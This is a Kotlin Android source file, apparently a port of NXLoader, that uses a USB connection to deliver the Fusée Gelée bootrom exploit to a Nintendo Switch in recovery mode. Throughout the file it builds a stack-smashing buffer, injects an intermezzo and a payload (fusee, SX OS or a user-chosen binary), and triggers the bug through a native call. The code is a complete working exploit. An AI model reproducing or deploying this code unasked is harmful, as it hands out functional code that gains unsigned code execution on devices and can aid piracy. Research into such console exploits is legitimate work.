package hh.nxloaderrb

import android.content.Context
import android.content.SharedPreferences
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbDeviceConnection
import android.hardware.usb.UsbEndpoint
import android.hardware.usb.UsbInterface
import android.hardware.usb.UsbManager
import android.util.Log

import java.io.FileInputStream
import java.io.IOException
import java.io.InputStream
import java.nio.ByteBuffer
import java.nio.ByteOrder

//Base on https://github.com/DavidBuchanan314/NXLoader
//Rewrite by kotlin

class PrimaryLoader  {
    private val TAG = "ConnectTag"
    fun handleDevice(context: Context, device: UsbDevice,injectionprogress: Injectionprogress,useSX:Boolean=false) {
        Log.d(TAG, "[+] Launching primary payload!!!")

        val mUsbManager = context.getSystemService(Context.USB_SERVICE) as UsbManager
        val intf = device.getInterface(0)
        val endpoint_in = intf.getEndpoint(0)
        val endpoint_out = intf.getEndpoint(1)
        val conn = mUsbManager.openDevice(device)
        conn.claimInterface(intf, true)

        /* Step 1: Read device ID */

        val deviceID = ByteArray(16)
        if (conn.bulkTransfer(endpoint_in, deviceID, deviceID.size, 999) != deviceID.size) {
            Log.d(TAG, "[-] Failed to read device ID, bailing out :(")
            return
        }

        Log.d(TAG, "[+] Read device ID: " + Utils.bytesToHex(deviceID))

        /* Step 2: Start building payload */

        val payload = ByteBuffer.allocate(MAX_LENGTH)
        payload.order(ByteOrder.LITTLE_ENDIAN)

        payload.putInt(MAX_LENGTH)
        payload.put(ByteArray(676))

        // smash the stack with the address of the intermezzo
        var i = RCM_PAYLOAD_ADDR
        while (i < INTERMEZZO_LOCATION) {
            payload.putInt(INTERMEZZO_LOCATION)
            i += 4
        }

        val intermezzo: ByteArray
        try {
            val intermezzoStream = context.assets.open("intermezzo.bin")
            intermezzo = ByteArray(intermezzoStream.available())
            intermezzoStream.read(intermezzo)
            intermezzoStream.close()
        } catch (e: IOException) {
            Log.d(TAG, "[-] Failed to read intermezzo: " + e.toString())
            injectionprogress.onFailed("Failed to read intermezzo")

            return
        }

        payload.put(intermezzo)

        // pad until payload
        payload.put(ByteArray(PAYLOAD_LOAD_BLOCK - INTERMEZZO_LOCATION - intermezzo.size))

        // write the actual payload file
        try {
            payload.put(getPayload(context,useSX))
        } catch (e: IOException) {
            Log.d(TAG, "[-] Failed to read payload: " + e.toString())
            injectionprogress.onFailed("[-] Failed to read payload: " + e.toString())

            return
        }

        val unpadded_length = payload.position()
        payload.position(0)
        // always end on a high buffer
        var low_buffer = true
        val chunk = ByteArray(0x1000)
        var bytes_sent: Int
        bytes_sent = 0
        while (bytes_sent < unpadded_length || low_buffer) {
            payload.get(chunk)
            if (conn.bulkTransfer(endpoint_out, chunk, chunk.size, 999) != chunk.size) {
                Log.d(TAG, "[-] Sending payload failed at offset " + Integer.toString(bytes_sent))
                injectionprogress.onFailed("[-] Sending payload failed at offset " + Integer.toString(bytes_sent))

                return
            }
            low_buffer = low_buffer xor true
            bytes_sent += 0x1000
        }
        injectionprogress.onCompleted()
        Log.d(TAG, "[+] Sent " + Integer.toString(bytes_sent) + " bytes")

        // 0x7000 = STACK_END = high DMA buffer address
        when (nativeTriggerExploit(conn.fileDescriptor, 0x7000)) {
            0 -> Log.d(TAG, "[+] Exploit triggered!")
            -1 -> Log.d(TAG, "[-] SUBMITURB failed :(")
            -2 -> Log.d(TAG, "[-] DISCARDURB failed :(")
            -3 -> Log.d(TAG, "[-] REAPURB failed :(")
            -4 -> Log.d(TAG, "[-] Wrong URB reaped :( Maybe that doesn't matter?")
            else -> {
                Log.d(TAG, "[-] How did you get here!?")
                return
            }
        }

        conn.releaseInterface(intf)
        conn.close()
    }

    @Throws(IOException::class)
    private fun getPayload(context: Context,useSX:Boolean): ByteArray {
        val sharepreferences = context.getSharedPreferences("Config", Context.MODE_PRIVATE)
        val payload_name = sharepreferences.getString("binpath", null)
        var payload_file: InputStream
        if(useSX)
            payload_file = context.assets.open("SXOS.bin")
        else {
            if (payload_name == null) {
                Log.d(TAG, "[*] Opening SXOS payload")
               payload_file = context.assets.open("fusee.bin")
            } else {
                Log.d(TAG, "[*] Opening custom payload ($payload_name)")
                payload_file = FileInputStream(payload_name)
            }
        }
        val payload_data = ByteArray(payload_file.available())
        Log.d(TAG, "[+] Read " + Integer.toString(payload_file.read(payload_data)) + " bytes from payload file")
        payload_file.close()
        return payload_data
    }

    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    external fun nativeTriggerExploit(fd: Int, length: Int): Int

    companion object {
        private val RCM_PAYLOAD_ADDR = 0x40010000
        private val INTERMEZZO_LOCATION = 0x4001F000
        private val PAYLOAD_LOAD_BLOCK = 0x40020000
        private val MAX_LENGTH = 0x30298

        // Used to load the 'native-lib' library on startup.
        init {
            System.loadLibrary("native-lib")
        }
    }

    interface Injectionprogress {
        fun onCompleted()
        fun onFailed(errormsg:String)
    }
}